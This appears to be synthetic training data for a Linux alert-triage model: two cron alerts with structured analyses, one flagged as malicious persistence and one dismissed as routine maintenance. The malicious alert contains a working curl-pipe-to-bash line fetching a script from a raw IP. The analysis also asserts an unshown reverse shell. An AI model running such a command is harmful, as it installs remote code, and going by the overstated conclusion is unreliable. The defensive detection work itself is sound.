messages.content: You are the Host Forensics Expert. Target OS: Linux/Unix. Vector Space: 5D sentinel_math. Schema: comm, command_line, uid, file_path, syscall. Identify persistence tradecraft. Output MITRE ATT&CK + containment recommendation.

Spatial Anomaly Detected.
Source: linux_sentinel
Vector: <|spatial_vector|>
Linux Sentinel — Cron Job Persistence.
Host: WS-61  User: rbrown (uid=0)
  file_written: /etc/cron.hourly/check
  cron_entry: 0 * * * * curl -s http://104.21.30.211/update.sh | bash
  written_by_process: python3
  trigger: cron daemon (automatic)

<analysis>
[AXIS 1] Benign Alternative Assessment:
  Legitimate maintenance cron jobs are created by root during administrative sessions pointing to scripts in /opt/ or /usr/local/bin/ with descriptive comments. Cron entries with /dev/tcp redirects or piping curl to bash have no admin use case.
[AXIS 2] Behavioral Proof Assessment:
  cron_entry='0 * * * * curl -s http://104.21.30.211/update.sh | bash' — download-and-execute (curl|bash) pattern. Written by python3 (not crontab -e from root shell). path=/etc/cron.hourly/check (cron directory, executes on schedule).
[AXIS 3] Entity Coverage:
  Host WS-61: cron daemon will trigger malicious action periodically. Persists across reboots. Outbound connection or hidden binary execution on every trigger.
[CONCLUSION] Cron-based persistence confirmed — reverse shell or download-execute pattern.
</analysis>
TRUE POSITIVE. MITRE T1053.003 (Scheduled Task/Job: Cron). Remove cron entry, kill active reverse shell, audit /tmp.
RECOMMENDED_ACTION: contain

Linux Sentinel — Cron Job Addition.
  file_written: /etc/cron.d/logrotate-custom
  cron_entry: 0 2 * * * root /usr/sbin/logrotate /etc/logrotate.conf
  added_by: root (SSH session)  ticket=OPS-152

<analysis>
[AXIS 1] Benign Alternative Assessment:
  Root admin adding logrotate cron job pointing to /usr/sbin/logrotate — standard maintenance.
[AXIS 2] Behavioral Proof Assessment:
  entry uses /usr/sbin/logrotate (system binary). root SSH session. Ticket OPS-152.
[AXIS 3] Entity Coverage:
  Authorized system maintenance cron job — system binary, root session, ticket.
[CONCLUSION] Authorized maintenance cron job. No action.
</analysis>
FALSE POSITIVE. T1053.003 — AUTHORIZED MAINTENANCE. No action.
RECOMMENDED_ACTION: dismiss
